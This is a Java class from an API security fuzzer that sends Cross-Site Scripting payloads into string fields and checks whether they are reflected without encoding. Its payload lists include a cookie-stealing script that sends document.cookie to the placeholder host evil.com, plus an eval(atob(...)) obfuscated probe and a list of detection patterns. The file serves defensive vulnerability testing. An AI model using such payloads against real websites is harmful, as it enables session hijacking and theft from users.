package com.endava.cats.fuzzer.fields;

import com.endava.cats.annotations.FieldFuzzer;
import com.endava.cats.args.SecurityFuzzerArguments;
import com.endava.cats.fuzzer.executor.SimpleExecutor;
import com.endava.cats.fuzzer.fields.base.BaseSecurityInjectionFuzzer;
import com.endava.cats.report.TestCaseListener;
import jakarta.inject.Singleton;

import java.util.List;

/**
 * Fuzzer that sends XSS (Cross-Site Scripting) payloads in string fields.
 * <p>
 * This fuzzer tests for XSS vulnerabilities by sending common XSS payloads
 * and checking if they are reflected in the response without proper encoding.
 * </p>
 */
@Singleton
@FieldFuzzer
public class XssInjectionInStringFieldsFuzzer extends BaseSecurityInjectionFuzzer {

    private static final List<String> TOP_XSS_PAYLOADS = List.of(
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "'\"><script>alert('XSS')</script>",
            "\"onmouseover=\"alert(1)\"",
            "<input onfocus=alert(1) autofocus>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "<iframe src=\"javascript:alert('XSS')\">"
    );

    private static final List<String> ALL_XSS_PAYLOADS = List.of(
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<svg/onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=\"javascript:alert('XSS')\">",
            "<a href=\"javascript:alert('XSS')\">click</a>",
            "'\"><script>alert('XSS')</script>",
            "'-alert(1)-'",
            "\"onmouseover=\"alert(1)\"",
            "'onmouseover='alert(1)'",
            "<div onmouseover=\"alert('XSS')\">",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=\"alert(1)\">",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "#{alert(1)}",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src=\"x\" onerror=\"eval(atob('YWxlcnQoMSk='))\">",
            "<svg><animate onbegin=alert(1)>",
            "<math><maction actiontype=\"statusline#http://evil.com\">click",
            "data:text/html,<script>alert(1)</script>",
            "<object data=\"javascript:alert(1)\">",
            "<embed src=\"javascript:alert(1)\">"
    );

    private static final List<String> XSS_ERROR_PATTERNS = List.of(
            "<script>",
            "javascript:",
            "onerror=",
            "onload=",
            "onmouseover=",
            "onfocus=",
            "onclick=",
            "onmouseout=",
            "onkeypress=",
            "onsubmit="
    );

    /**
     * Creates a new XssInjectionInStringFieldsFuzzer instance.
     *
     * @param simpleExecutor          the executor used to run the fuzz logic
     * @param testCaseListener        the test case listener for reporting results
     * @param securityFuzzerArguments the security fuzzer arguments
     */
    public XssInjectionInStringFieldsFuzzer(SimpleExecutor simpleExecutor, TestCaseListener testCaseListener,
                                            SecurityFuzzerArguments securityFuzzerArguments) {
        super(simpleExecutor, testCaseListener, securityFuzzerArguments);
    }

    @Override
    protected String getInjectionType() {
        return "XSS";
    }

    @Override
    protected List<String> getTopInjectionPayloads() {
        return TOP_XSS_PAYLOADS;
    }

    @Override
    protected List<String> getAllInjectionPayloads() {
        return ALL_XSS_PAYLOADS;
    }

    @Override
    protected List<String> getErrorPatterns() {
        return XSS_ERROR_PATTERNS;
    }

    @Override
    protected boolean shouldCheckForPayloadReflection() {
        return true;
    }

    @Override
    public String description() {
        return "iterate through each string field and send XSS payloads to detect Cross-Site Scripting vulnerabilities";
    }
}
